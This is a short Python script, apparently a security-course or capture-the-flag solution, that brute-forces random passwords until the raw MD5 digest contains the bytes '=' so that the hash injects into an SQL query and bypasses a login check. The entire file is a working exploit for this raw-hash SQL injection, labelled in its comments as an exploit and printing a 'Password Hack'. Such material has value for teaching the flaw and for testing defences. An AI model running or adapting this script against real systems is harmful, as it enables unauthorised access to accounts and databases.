from pymd5 import md5
import re #regex will be used to check string format
import random #to generate random bits for password hash

# Exploit to generate an input that will hash to a string that includes 
# characters like ' to escape SQL query...

# want expression '=' as the encoded md5 hash, so figure out input that will hash to that.. (3 chars)

while(True):
    password = ""
    for i in range(0,3): #construct random password
        password = password + str(random.getrandbits(32))
    contains_desired = re.search(b"'='", md5(password).digest()) # will check if char is in encoded md5 hash using regex
    if contains_desired:
        print("Password Hack = " + password)
        break
    
